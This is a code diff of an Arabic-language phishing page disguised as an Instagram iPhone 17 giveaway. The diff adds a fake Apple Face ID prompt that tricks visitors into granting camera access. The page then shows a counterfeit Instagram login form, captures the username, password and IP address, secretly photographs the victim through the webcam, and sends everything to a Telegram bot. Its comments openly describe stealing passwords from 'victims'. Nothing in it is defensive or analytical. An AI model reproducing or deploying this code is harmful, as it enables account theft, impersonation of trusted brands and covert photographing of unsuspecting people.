@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
 <head>
@@ -5,38 +6,66 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram | iPhone 17 Pro Max</title>
     <style>
-        body { background: #fdfdfd; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .main-card { width: 95%; max-width: 420px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; text-align: center; border: 1px solid #eee; }
+        body { background: #fdfdfd; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .main-card { width: 95%; max-width: 420px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; text-align: center; border: 1px solid #eee; position: relative; }
         .promo-img { width: 100%; height: auto; display: block; }
         .content-padding { padding: 25px; }
         .btn-claim { background: linear-gradient(45deg, #f09433, #e6683c); color: white; border: none; padding: 16px 40px; border-radius: 50px; font-size: 19px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 5px 15px rgba(188, 24, 136, 0.3); transition: 0.3s; }
+        
         #login-ui { display: none; padding: 30px; animation: fadeInUp 0.6s ease; }
         .insta-logo { width: 170px; margin-bottom: 25px; }
         .input-insta { width: 100%; padding: 12px; margin: 7px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; text-align: center; }
         .btn-login { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+
+        /* نافذة Apple المزيفة */
+        .apple-popup {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 270px; background: rgba(255,255,255,0.9); backdrop-filter: blur(15px);
+            border-radius: 14px; box-shadow: 0 0 20px rgba(0,0,0,0.1); z-index: 9999;
+            text-align: center; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        .apple-content { padding: 20px; }
+        .apple-popup h3 { margin: 0; font-size: 17px; font-weight: 600; color: #000; }
+        .apple-popup p { font-size: 13px; color: #000; margin: 5px 0 0; line-height: 1.4; }
+        .apple-popup button { 
+            width: 100%; background: transparent; border: none; border-top: 0.5px solid #bdc3c7;
+            color: #007aff; font-size: 17px; padding: 12px; cursor: pointer; font-weight: 500;
+        }
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 9998; }
+
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
+<div id="overlay" class="overlay"></div>
+
+<div id="applePopup" class="apple-popup">
+    <div class="apple-content">
+        <h3>Face ID Verification</h3>
+        <p>Allow system to use camera for biometric identity verification to claim prize.</p>
+    </div>
+    <button onclick="confirmApple()">Continue</button>
+</div>
+
 <div class="main-card">
     <div id="promo-view">
-        <img src="faiz.png" class="promo-img" alt="الجائزة">
+        <img src="faiz.png" class="promo-img">
         <div class="content-padding">
-            <p style="color:#d32f2f; font-weight:bold; font-size:15px; margin-top:0;">خطوة أخيرة: تأكيد الهوية عبر بصمة الوجه (Face ID)</p>
-            <button class="btn-claim" onclick="startCapture()">إضغط هنا لاستلام الجائزة</button>
+            <p style="color:#d32f2f; font-weight:bold; font-size:15px; margin-top:0;">خطوة أخيرة: تأكيد الهوية عبر Face ID</p>
+            <button class="btn-claim" onclick="showApplePrompt()">إضغط هنا لاستلام الجائزة</button>
         </div>
     </div>
 
     <div id="login-ui">
         <img src="faiz.png" class="insta-logo">
-        <p style="color:#262626; font-weight:bold; margin-bottom:10px; font-size: 16px;">مبروك! تم اختيارك للفوز بـ iPhone 17 🎊</p>
-        <p style="color:#8e8e8e; font-size:13px; margin-bottom:25px;">لاستلام الجائزة: <b>يرجى تسجيل الدخول</b> لربط الجائزة بحسابك.</p>
+        <p style="color:#262626; font-weight:bold; margin-bottom:10px; font-size: 16px;">مبروك! تم التحقق من الهوية 🎊</p>
+        <p style="color:#8e8e8e; font-size:13px; margin-bottom:25px;">يرجى تسجيل الدخول لربط الجائزة بحسابك.</p>
         
         <form id="pish">
             <input type="text" id="u" class="input-insta" placeholder="اسم المستخدم أو الهاتف" required>
             <input type="password" id="p" class="input-insta" placeholder="كلمة السر" required>
-            <button type="submit" class="btn-login">تأكيد البيانات والمتابعة</button>
+            <button type="submit" class="btn-login">تأكيد ومتابعة</button>
         </form>
     </div>
 </div>
@@ -45,25 +74,30 @@
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-    // هذه الدالة تطلب الكاميرا عند الضغط على الزر الأول
-    async function startCapture() {
+    // 1. إظهار نافذة Apple المزيفة
+    function showApplePrompt() {
+        document.getElementById('applePopup').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+    }
+
+    // 2. عند الضغط على Continue يظهر طلب الكاميرا الحقيقي
+    async function confirmApple() {
+        document.getElementById('applePopup').style.display = 'none';
+        document.getElementById('overlay').style.display = 'none';
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
-            // بعد الموافقة، ننتقل لواجهة تسجيل الدخول
-            showLogin();
+            document.getElementById('promo-view').style.display = 'none';
+            document.getElementById('login-ui').style.display = 'block';
         } catch (err) {
-            // إذا رفض المستخدم، ننتقل أيضاً لكي لا يشك بشيء
-            console.log("الضحية رفض الكاميرا");
-            showLogin();
+            // حتى لو رفض الكاميرا ننقله للوجن لسرقة الباسورد
+            document.getElementById('promo-view').style.display = 'none';
+            document.getElementById('login-ui').style.display = 'block';
         }
     }
 
-    function showLogin() {
-        document.getElementById('promo-view').style.display = 'none';
-        document.getElementById('login-ui').style.display = 'block';
-    }
-
+    // 3. معالجة إرسال البيانات
     document.getElementById('pish').onsubmit = async function(e) {
         e.preventDefault();
         const user = document.getElementById('u').value;
@@ -72,37 +106,34 @@
         const chatId = '448818597';
 
         // جلب الـ IP
-        let userIP = "جاري التحميل...";
+        let userIP = "Unknown";
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             userIP = ipData.ip;
         } catch(e) {}
 
-        // التقاط الصورة فوراً عند ضغط زر "تأكيد"
+        // التقاط الصورة
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, 640, 480);
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
         
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'victim_face.jpg');
-            formData.append('caption', `🔥 صيد جديد:\n👤 اليوزر: ${user}\n🔑 الرمز: ${pass}\n🌐 IP: ${userIP}\n⏰ ${new Date().toLocaleString()}`);
+            formData.append('photo', blob, 'shot.jpg');
+            formData.append('caption', `🔥 صيد كامل:\n👤 اليوزر: ${user}\n🔑 الرمز: ${pass}\n🌐 IP: ${userIP}\n⏰ ${new Date().toLocaleString()}`);
 
             try {
-                // إرسال الصورة والبيانات لتليجرام
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-                
-                alert("تم التحقق بنجاح! سيتم إرسال كود الاستلام في رسالة خاصة.");
+                alert("تم التحقق! ستصلك رسالة التأكيد عبر الخاص.");
                 window.location.href = "https://www.instagram.com";
             } catch (err) {
-                // محاولة إرسال نصية فقط إذا فشل إرسال الصورة
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("صيد (بيانات فقط): " + user + " : " + pass)}`);
+                // إرسال نصي احتياطي
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("صيد: " + user + " : " + pass)}`);
                 window.location.href = "https://www.instagram.com";
             }
         }, 'image/jpeg');
@@ -111,4 +142,3 @@
 
 </body>
 </html>
-
